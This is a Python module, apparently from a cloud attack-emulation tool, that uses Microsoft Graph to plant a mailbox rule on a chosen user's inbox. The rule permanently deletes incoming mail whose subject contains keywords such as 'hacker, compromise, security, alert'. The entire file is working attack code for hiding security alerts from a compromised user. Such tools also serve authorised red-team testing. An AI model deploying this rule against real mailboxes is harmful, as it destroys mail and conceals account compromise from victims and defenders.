'''
Module Name: Email_Deletion_Rule
Module Description: Setup email deletion rule on a users mailbox. Privileges: MailboxSettings.ReadWrite
'''
from core.GraphFunctions import graph_post_request

def TechniqueMain(rule_name, user_id, keywords):

    # input validation
    if keywords in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if user_id in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None

    # break input string into a list for graph input
    keywords = keywords.split(",")
    # remove any leading or trailing spaces from input
    for i,words in enumerate(keywords):
        keywords[i] = words.strip()

    endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}/mailFolders/inbox/messageRules"
    data = {
        "displayName": rule_name,
        "sequence": 1,
        "isEnabled": "true", 
        "conditions": {
            "sentToMe": "true",
            "subjectContains": keywords
        },
        "actions": {
            "permanentDelete": 'true',
            "stopProcessingRules": 'true'
        }
    }

    try:
        raw_response = graph_post_request(url = endpoint_url, data = data)

        # delete rule setup successfull
        if 200 <= raw_response.status_code < 300:
            # parse raw response => pretty response
            try:
                # create pretty response
                pretty_response = {}

                pretty_response["Success"] = {
                    'Message' : "Email deletion rule deployed on mailbox",
                    'Rule Name' : rule_name,
                    'Rule Id' : raw_response.json().get('id', 'N/A'),
                    'Enabled' : raw_response.json().get('isEnabled', 'N/A'),
                    'Conditions' : raw_response.json().get('conditions', 'N/A'),
                    'Actions' : raw_response.json().get('actions', 'N/A'),
                    'Sequence' : raw_response.json().get('sequence', 'N/A'),
                }
                return True, raw_response.json(), pretty_response
            except:
                # return only raw response if pretty response fails
                return True, raw_response.json(), None
        
        # mailbox rule deployment operation failed
        else:
            return False, {"Error" : {"Response Status" : raw_response.status_code, "Code" : raw_response.json().get('error').get('code', 'N/A'), "Message" : raw_response.json().get('error').get('message', 'N/A')}}, None
    
    except Exception as e:
        return False, {"Error" : e}, None

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Rule Name", "id" : "mail-deletion-rule-name-text-input", "type" : "text", "placeholder" : "My Secret Rule", "element_type" : "dcc.Input"},
        {"title" : "Mailbox Address", "id" : "mail-deletion-config-mailbox-addr-email-input", "type" : "email", "placeholder" : "user@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Deletion Rule Keywords", "id" : "mail-deletion-config-keywords-text-input", "type" : "text", "placeholder" : "hacker, compromise, security, alert", "element_type" : "dcc.Input"}
    ]